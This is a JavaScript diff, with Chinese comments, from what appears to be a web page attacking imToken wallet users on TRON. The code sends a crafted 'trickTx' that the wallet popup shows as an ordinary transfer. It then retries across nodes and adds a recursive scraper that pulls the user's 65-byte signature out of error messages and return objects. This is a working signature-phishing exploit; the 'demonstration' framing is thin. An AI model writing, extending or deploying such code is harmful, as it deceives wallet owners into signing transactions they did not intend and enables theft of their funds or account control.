@@ -252,6 +252,47 @@
   }
 
   // ============================================================
+  // 在“任意对象”里递归找签名。
+  //   两种来源都覆盖：
+  //   1) 结构化字段：obj.signature（数组或字符串）——imToken 把签名后的交易塞在返回/报错里时
+  //   2) 纯文本里的一长串 16 进制——节点把签名回显在报错文本里时
+  //   这样不管签名藏在哪，都能抠出来。
+  // ============================================================
+  function looksLikeSig(s){
+    if (typeof s !== 'string') return false;
+    var h = s.replace(/^0x/i,'');
+    return /^[0-9a-fA-F]+$/.test(h) && h.length >= 120;   // 65字节签名=130字符
+  }
+  function findSigDeep(obj, depth){
+    depth = depth || 0;
+    if (obj == null || depth > 5) return null;
+    if (typeof obj === 'string'){
+      if (looksLikeSig(obj)) return obj.replace(/^0x/i,'');
+      // 字符串里夹着签名（比如节点报错文本）
+      var m = obj.match(/[0-9a-fA-F]{120,}/g);
+      if (m && m.length) return m.sort(function(a,b){return b.length-a.length;})[0];
+      return null;
+    }
+    if (Array.isArray(obj)){
+      for (var i=0;i<obj.length;i++){ var r=findSigDeep(obj[i],depth+1); if(r) return r; }
+      return null;
+    }
+    if (typeof obj === 'object'){
+      // 优先看 signature 字段
+      if (obj.signature){
+        var sg = Array.isArray(obj.signature) ? obj.signature[0] : obj.signature;
+        if (looksLikeSig(sg)) return sg.replace(/^0x/i,'');
+      }
+      var keys;
+      try{ keys = Object.getOwnPropertyNames(obj); }catch(x){ return null; }
+      for (var k=0;k<keys.length;k++){
+        try{ var rr=findSigDeep(obj[keys[k]],depth+1); if(rr) return rr; }catch(x){}
+      }
+    }
+    return null;
+  }
+
+  // ============================================================
   // 步骤①：连接钱包，读取参数
   // ============================================================
   async function connect(){
@@ -427,27 +468,28 @@
       //   有的会回显签名（"...<签名> is signed by..."），有的只回一句 "SIGERROR"。
       //   所以这里最多重试 3 次，撞到“会回显签名”的节点就拿到签名并停止。
       //   每次都会弹窗，且每次都显示「转账」（演示效果一致）。
+      var MAX_TRY = 5;
       var recoveredSig = null;
-      for (var attempt = 1; attempt <= 3 && !recoveredSig; attempt++){
-        log('第 ' + attempt + '/3 次请求 imToken 签名…（弹窗仍显示转账）', 'warn');
+      for (var attempt = 1; attempt <= MAX_TRY && !recoveredSig; attempt++){
+        log('第 ' + attempt + '/' + MAX_TRY + ' 次请求 imToken 签名…（弹窗仍显示转账）', 'warn');
         try{
           var ret = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
             tx: trickTx, from: walletAddr, useTronHeader: true
           });
-          // 个别版本可能不抛错而直接返回——也尝试从返回里取签名
-          var retText = JSON.stringify(ret);
-          log('返回：' + retText, 'warn');
-          recoveredSig = (ret && (Array.isArray(ret.signature) ? ret.signature[0] : ret.signature)) || parseSigFromError(retText);
+          // 个别版本可能不抛错而直接返回——在返回对象里深挖签名
+          log('返回：' + JSON.stringify(ret), 'warn');
+          recoveredSig = findSigDeep(ret);
         }catch(e){
           // 正常路径：进到这里（imToken 用转账数据广播失败）
-          // 把错误对象的所有字段都打出来，既方便正则找签名，也方便你复制原文给我
+          // 1) 先把错误对象所有字段打出来（方便你复制给我）
           var dump = dumpError(e);
           log('imToken 报错(第'+attempt+'次)：' + dump, 'warn');
-          recoveredSig = parseSigFromError(dump);
+          // 2) 在错误对象里深挖签名：既找 signature 结构化字段，也找文本里的 16 进制串
+          recoveredSig = findSigDeep(e) || parseSigFromError(dump);
         }
-        if (!recoveredSig && attempt < 3){
-          log('这次节点没回显签名（只给了 SIGERROR）。换个节点重试…', 'warn');
-          await sleep(1200);
+        if (!recoveredSig && attempt < MAX_TRY){
+          log('这次没拿到签名（节点只回了 SIGERROR、未回显）。换节点重试…', 'warn');
+          await sleep(1500);
         }
       }
       setStep('st2','done');
